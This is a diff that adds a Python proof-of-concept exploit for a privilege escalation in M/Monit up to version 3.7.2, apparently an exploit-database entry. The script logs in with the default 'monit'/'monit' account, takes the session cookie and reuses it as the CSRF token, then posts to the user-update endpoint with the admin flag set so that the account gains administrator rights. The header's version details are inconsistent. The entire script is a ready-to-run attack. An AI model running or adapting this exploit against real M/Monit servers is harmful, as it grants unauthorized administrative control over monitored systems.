@@ -1,0 +1,54 @@
+#!/usr/env/python3
+
+"""
+	Vulnerability title: M/Monit <= 3.7.2 - Privilege Escalation
+	Author: Dolev Farhi
+	Vulnerable version: 2.0.151021	
+ 	Link: https://mmonit.com
+ 	Date: 2/17/2019
+"""
+
+import sys
+import requests
+
+MMONIT_URL  = 'http://ip.add.re.ss:8080'
+MMONIT_USER = 'monit' # Default built in unprivileged user
+MMONIT_PASS = 'monit'
+
+s = requests.Session()
+
+s.get(MMONIT_URL + '/')
+
+resp = s.post(MMONIT_URL + '/z_security_check', params={'z_username':MMONIT_USER,'z_password':MMONIT_PASS})
+
+if 'Invalid username and/or password' in resp.text:
+	print('Error logging in')  
+	sys.exit(1)
+
+
+zessionid = s.cookies.get_dict()['zsessionid']
+
+headers = {
+		'CSRFToken':zessionid,
+}
+
+resp = s.post(MMONIT_URL + '/admin/users/update',  
+					headers=headers, 
+					params={'CSRFTOKEN':zessionid,
+							'fullname':'john doe',
+							'password':MMONIT_USER,
+							'title':'',
+							'email':'',
+							'phone':'',
+							'mobile':'',
+							'imname':'',
+							'uname':MMONIT_PASS,
+							'imtype':None,
+							'admin':'on',
+							'oldpassword':'D9CFD4AF77E33817DE2160E0C1C7607C'
+							})
+
+if resp.status_code == 200:
+	print('Success! You are now M/Monit admin')
+else:
+	print('Something went wrong')
